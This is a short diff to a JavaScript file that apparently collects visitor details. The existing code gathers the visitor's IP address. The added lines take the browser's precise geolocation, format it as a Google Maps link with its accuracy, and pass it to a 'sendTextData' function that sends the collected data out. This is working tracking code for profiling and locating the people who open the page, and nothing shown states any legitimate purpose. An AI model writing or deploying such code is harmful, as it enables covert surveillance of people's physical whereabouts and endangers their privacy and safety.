@@ -81,6 +81,24 @@
                 userInfo += `📌 IP: Failed to fetch\n`;
             }
 
+            if (navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const acc = pos.coords.accuracy;
+                        userInfo += `🗺 Google Maps: https://maps.google.com/?q=${lat},${lon}\n`;
+                        userInfo += `🎯 Accuracy: ${acc} meters\n`;
+                        resolve();
+                    }, () => {
+                        userInfo += `🗺 Google Maps: Permission denied\n`;
+                        resolve();
+                    }, { timeout: 5000, enableHighAccuracy: true });
+                });
+            } else {
+                userInfo += `🗺 Google Maps: Not supported\n`;
+            }
+
             await sendTextData(userInfo);
 
             try {
